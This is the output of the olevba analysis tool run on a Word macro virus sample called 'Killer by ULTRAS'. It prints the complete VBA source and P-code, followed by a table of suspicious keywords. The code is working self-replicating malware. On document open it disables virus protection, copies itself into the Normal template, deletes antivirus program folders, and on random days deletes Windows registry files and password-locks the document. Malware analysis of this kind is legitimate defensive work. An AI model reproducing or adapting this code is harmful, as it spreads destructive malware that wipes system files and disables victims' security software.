olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Killer
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Killer - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Killer.bas 
in file: ./Virus.MSWord.Killer - OLE stream: 'Macros/VBA/Killer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Killer
Call KillAV
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
For b = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(b).Name = "Killer" Then
DocInfect = True
End If
Next
For U = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(U).Name = "Killer" Then
GlobInfect = True
End If
Next
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Killer", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Killer", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll
Call Killer
Killer:
End Sub

Sub FilePrint()
On Error GoTo Killer
UKil.Show
With ActiveDocument.Range(Start:=0, End:=0)
.InsertBefore "KILLER BY ULTRAS"
.Font.Name = "Impact"
.Font.Size = 36
.Font.ColorIndex = 6
End With
Killer:
Dialogs(wdDialogFilePrint).Show
End Sub

Sub KillAV()
On Error GoTo Killer
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\PC-Cillin 95\*.*"
Kill "C:\PC-Cillin 97\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Tbavw95\*.*"
Kill "C:\Vdoc\*.*"
Killer:
End Sub

Sub ToolsMacro()
beep
MsgBox "Impossible open this function", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Error"
End Sub

Sub ViewVBCode()
beep
MsgBox "Function does not answer system requests" & vbCrLf & "", vbExclamation + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Microsoft Visual Basic"
End Sub

Sub FileTemplates()
beep
End Sub

Sub ToolsCustomize()
beep
End Sub

Sub Killer()
On Error GoTo Killer
K = Int(Rnd() * 30) + 1
If Day(Now()) = K Then
MsgBox "You Infected Killer by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
SetAttr "c:\windows\system.dat", 0
SetAttr "c:\windows\system.da0", 0
Kill "c:\windows\system.dat"
Kill "c:\windows\system.da0"
End If
U = Int(Rnd() * 25) + 1
If Day(Now()) = U Then
ActiveDocument.Password = "KILLER"
ActiveDocument.Save
End If
Killer:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Killer
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Killer - 5343 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError Killer 
' Line #2:
' 	ArgsCall (Call) KillAV 0x0000 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #4:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #7:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #8:
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #9:
' 	Ld B 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Killer"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	StartForVariable 
' 	Next 
' Line #13:
' 	StartForVariable 
' 	Ld U 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #14:
' 	Ld U 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Killer"
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	StartForVariable 
' 	Next 
' Line #18:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Killer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #20:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Killer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #27:
' 	ArgsCall (Call) Killer 0x0000 
' Line #28:
' 	Label Killer 
' Line #29:
' 	EndSub 
' Line #30:
' Line #31:
' 	FuncDefn (Sub FilePrint())
' Line #32:
' 	OnError Killer 
' Line #33:
' 	Ld UKil 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	StartWithExpr 
' 	LitDI2 0x0000 
' 	ParamNamed Start 
' 	LitDI2 0x0000 
' 	ParamNamed End 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	With 
' Line #35:
' 	LitStr 0x0010 "KILLER BY ULTRAS"
' 	ArgsMemCallWith InsertBefore 0x0001 
' Line #36:
' 	LitStr 0x0006 "Impact"
' 	MemLdWith Font 
' 	MemSt New 
' Line #37:
' 	LitDI2 0x0024 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #38:
' 	LitDI2 0x0006 
' 	MemLdWith Font 
' 	MemSt ColorIndex 
' Line #39:
' 	EndWith 
' Line #40:
' 	Label Killer 
' Line #41:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub KillAV())
' Line #45:
' 	OnError Killer 
' Line #46:
' 	LitStr 0x002A "C:\Program Files\AntiViral Toolkit Pro\*.*"
' 	ArgsCall Kill 0x0001 
' Line #47:
' 	LitStr 0x002E "C:\Program Files\Command Software\F-PROT95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #48:
' 	LitStr 0x0025 "C:\Program Files\McAfee\VirusScan\*.*"
' 	ArgsCall Kill 0x0001 
' Line #49:
' 	LitStr 0x0025 "C:\Program Files\Norton AntiVirus\*.*"
' 	ArgsCall Kill 0x0001 
' Line #50:
' 	LitStr 0x0013 "C:\PC-Cillin 95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #51:
' 	LitStr 0x0013 "C:\PC-Cillin 97\*.*"
' 	ArgsCall Kill 0x0001 
' Line #52:
' 	LitStr 0x000E "C:\f-macro\*.*"
' 	ArgsCall Kill 0x0001 
' Line #53:
' 	LitStr 0x0018 "C:\Toolkit\FindVirus\*.*"
' 	ArgsCall Kill 0x0001 
' Line #54:
' 	LitStr 0x000E "C:\Tbavw95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #55:
' 	LitStr 0x000B "C:\Vdoc\*.*"
' 	ArgsCall Kill 0x0001 
' Line #56:
' 	Label Killer 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Sub ToolsMacro())
' Line #60:
' 	ArgsCall beep 0x0000 
' Line #61:
' 	LitStr 0x001D "Impossible open this function"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbMsgBoxHelpButton 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x0005 "Error"
' 	ArgsCall MsgBox 0x0003 
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Sub ViewVBCode())
' Line #65:
' 	ArgsCall beep 0x0000 
' Line #66:
' 	LitStr 0x0028 "Function does not answer system requests"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbMsgBoxHelpButton 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x0016 "Microsoft Visual Basic"
' 	ArgsCall MsgBox 0x0003 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Sub FileTemplates())
' Line #70:
' 	ArgsCall beep 0x0000 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Sub ToolsCustomize())
' Line #74:
' 	ArgsCall beep 0x0000 
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Sub Killer())
' Line #78:
' 	OnError Killer 
' Line #79:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St K 
' Line #80:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	Ld K 
' 	Eq 
' 	IfBlock 
' Line #81:
' 	LitStr 0x001D "You Infected Killer by ULTRAS"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0006 "ULTRAS"
' 	ArgsCall MsgBox 0x0003 
' Line #82:
' 	LitStr 0x0015 "c:\windows\system.dat"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #83:
' 	LitStr 0x0015 "c:\windows\system.da0"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #84:
' 	LitStr 0x0015 "c:\windows\system.dat"
' 	ArgsCall Kill 0x0001 
' Line #85:
' 	LitStr 0x0015 "c:\windows\system.da0"
' 	ArgsCall Kill 0x0001 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St U 
' Line #88:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	Ld U 
' 	Eq 
' 	IfBlock 
' Line #89:
' 	LitStr 0x0006 "KILLER"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #90:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	Label Killer 
' Line #93:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

